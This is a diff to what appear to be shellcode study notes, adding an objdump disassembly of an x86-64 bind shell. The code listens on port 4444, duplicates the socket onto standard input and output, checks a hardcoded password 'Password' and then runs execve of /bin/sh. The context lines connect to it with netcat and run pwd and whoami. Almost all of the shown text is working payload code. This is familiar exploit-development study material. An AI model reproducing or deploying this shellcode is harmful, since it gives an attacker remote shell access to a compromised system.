@@ -9,7 +9,91 @@ nc localhost 4444
 # bind shell 
 pwd; whoami; etc 
 
-# Go back an 
+# For disassembly
 objdump -D -M intel thee-i-bind.o
+
+Ex.1 Dissembly concatentation 
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:	6a 29                	push   0x29
+   2:	58                   	pop    rax
+   3:	6a 02                	push   0x2
+   5:	5f                   	pop    rdi
+   6:	6a 01                	push   0x1
+   8:	5e                   	pop    rsi
+   9:	48 87 da             	xchg   rdx,rbx
+   c:	0f 05                	syscall 
+   e:	48 97                	xchg   rdi,rax
+  10:	48 31 c0             	xor    rax,rax
+  13:	89 44 24 fc          	mov    DWORD PTR [rsp-0x4],eax
+  17:	66 c7 44 24 fa 11 5c 	mov    WORD PTR [rsp-0x6],0x5c11
+  1e:	c6 44 24 f8 02       	mov    BYTE PTR [rsp-0x8],0x2
+  23:	48 83 ec 08          	sub    rsp,0x8
+  27:	6a 31                	push   0x31
+  29:	58                   	pop    rax
+  2a:	48 89 e6             	mov    rsi,rsp
+  2d:	6a 10                	push   0x10
+  2f:	5a                   	pop    rdx
+  30:	0f 05                	syscall 
+  32:	6a 32                	push   0x32
+  34:	58                   	pop    rax
+  35:	6a 02                	push   0x2
+  37:	5e                   	pop    rsi
+  38:	0f 05                	syscall 
+  3a:	6a 2b                	push   0x2b
+  3c:	58                   	pop    rax
+  3d:	48 83 ec 10          	sub    rsp,0x10
+  41:	48 89 e6             	mov    rsi,rsp
+  44:	6a 10                	push   0x10
+  46:	48 89 e2             	mov    rdx,rsp
+  49:	0f 05                	syscall 
+  4b:	49 89 c1             	mov    r9,rax
+  4e:	6a 03                	push   0x3
+  50:	58                   	pop    rax
+  51:	0f 05                	syscall 
+  53:	49 87 f9             	xchg   r9,rdi
+  56:	48 31 f6             	xor    rsi,rsi
+
+0000000000000059 <dup2>:
+  59:	6a 21                	push   0x21
+  5b:	58                   	pop    rax
+  5c:	0f 05                	syscall 
+  5e:	48 ff c6             	inc    rsi
+  61:	48 83 fe 02          	cmp    rsi,0x2
+  65:	e0 f2                	loopne 59 <dup2>
+
+0000000000000067 <CheckPass>:
+  67:	48 31 c0             	xor    rax,rax
+  6a:	6a 10                	push   0x10
+  6c:	5a                   	pop    rdx
+  6d:	48 83 ec 10          	sub    rsp,0x10
+  71:	48 89 e6             	mov    rsi,rsp
+  74:	31 ff                	xor    edi,edi
+  76:	0f 05                	syscall 
+  78:	48 b8 50 61 73 73 77 	movabs rax,0x64726f7773736150
+  7f:	6f 72 64 
+  82:	48 8d 3e             	lea    rdi,[rsi]
+  85:	48 af                	scas   rax,QWORD PTR es:[rdi]
+  87:	74 05                	je     8e <Execve>
+  89:	6a 3c                	push   0x3c
+  8b:	58                   	pop    rax
+  8c:	0f 05                	syscall 
+
+000000000000008e <Execve>:
+  8e:	48 31 c0             	xor    rax,rax
+  91:	48 89 c2             	mov    rdx,rax
+  94:	50                   	push   rax
+  95:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f2f6e69622f
+  9c:	2f 73 68 
+  9f:	53                   	push   rbx
+  a0:	48 89 e7             	mov    rdi,rsp
+  a3:	50                   	push   rax
+  a4:	57                   	push   rdi
+  a5:	48 89 e6             	mov    rsi,rsp
+  a8:	6a 3b                	push   0x3b
+  aa:	58                   	pop    rax
+  ab:	0f 05                	syscall 
+
 
 
